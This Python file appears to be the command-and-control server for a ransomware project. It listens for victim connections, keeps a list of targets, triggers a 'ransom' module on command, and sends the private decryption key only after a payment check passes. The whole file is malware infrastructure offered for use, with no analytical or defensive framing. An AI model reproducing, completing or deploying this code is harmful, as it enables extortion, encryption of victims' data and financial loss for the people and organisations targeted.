import socket
import threading
import globals
import time
import keygen
from cryptography.hazmat.primitives import serialization
import curses
import bus
import queue
import ransom

class Server:
    def __init__(self, bus: bus.Bus):
        # Create Socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addr = "0.0.0.0"
        self.port = 8080
        self.running = False
        self.bus = bus
        self.line = 0
        self.connections = []
        self.targets = []
    
    def start(self):
        # Bind and Listen
        self.sock.bind((self.addr, self.port))
        self.sock.listen(5)
        self.running = True
        self.log(f"Server started on {self.addr}:{self.port}")
        
    def log(self, log: str):
        self.bus.log_queue.put(log)

    def run(self):
        # Wait for connections
        threading.Thread(target=self._command_loop, daemon=True).start()
        while self.running:
            conn, addr = self.sock.accept()
            self.bus.connections.append({addr: conn})
            self.log(f"Connection from {addr[0]}:{addr[1]}")
            t = threading.Thread(target=self.handle_client, args=(conn, addr,))
            t.start()

    def _command_loop(self):
        while self.running:
            try:
                cmd = self.bus.cmd_queue.get(timeout=0.1)
                match cmd:
                    case "list":
                        self.list_connections()
                    case "ransom":
                        r = ransom.Ransom()

            except queue.Empty:
                pass
                      
    def handle_client(self, conn: socket.socket, addr):
        try:
            data = conn.recv(2048)
            self.log(f"Received data from {addr[0]}:{addr[1]}: {data.decode()}")
        except Exception as e:
            self.log(f"Something went wrong with {addr[0]}:{addr[1]}: {e}")
        finally:
            conn.close()
            self.log(f"Connection closed: {addr[0]}:{addr[1]}")

    def list_connections(self):
        if len(self.connections) == 0:
            self.log("No active connections")
            return
        for c in self.connections:
            self.log(f"{list(c.keys())[0][0]}:{list(c.keys())[0][1]}")

    def check_payment(self, conn):
        if globals.get_payment():
            self.send_key(conn)

    def send_key(self, conn):  
        with open("priv.pem", "r") as f:
            key = f.read()
        conn.send(key.encode())
        print("Sent private key")